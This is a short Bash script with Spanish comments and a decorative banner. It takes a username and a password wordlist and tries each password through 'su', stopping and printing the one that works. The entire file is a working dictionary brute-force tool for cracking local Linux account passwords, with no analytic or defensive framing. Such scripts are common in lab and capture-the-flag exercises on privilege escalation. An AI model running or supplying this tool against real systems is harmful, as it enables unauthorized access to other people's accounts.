#!/bin/bash


AZUL="\033[1;34m"
VERDE="\033[1;32m"
ROJO="\033[1;31;43m"
RESET="\033[0m"
BLANCO_CLARO="\033[1;97m"

echo -e "${AZUL}"
cat << "EOF"
  _____   _   _   _____   _   _   _  __  _____   
 / ____| | | | | |_   _| | \ | | | |/ / |_   _|  
| (___   | |_| |   | |   |  \| | | ' /    | |    
 \___ \  |  _  |   | |   | . ` | |  <     | |    
 ____) | | | | |  _| |_  | |\  | | . \   _| |_   
|_____/  |_| |_| |_____| |_| \_| |_|\_\ |_____|  
EOF
echo -e "${RESET}"

usuario=$1

diccionario=$2

# Intentar cada contraseña en la lista
while IFS= read -r password; do
    echo -e "${BLANCO_CLARO}Probando contraseña: $password${RESET}"
    echo "$password" | su "$usuario" -c ls > /dev/null 2>&1
    
    # Si la contraseña es correcta, se termina el script
    if [ $? -eq 0 ]; then
        echo -e "${VERDE}¡Contraseña correcta! La contraseña es: $password${RESET}"
        exit 0
    fi
done < "$diccionario"

echo -e "${ROJO}No se encontró la contraseña en la lista.${RESET}"
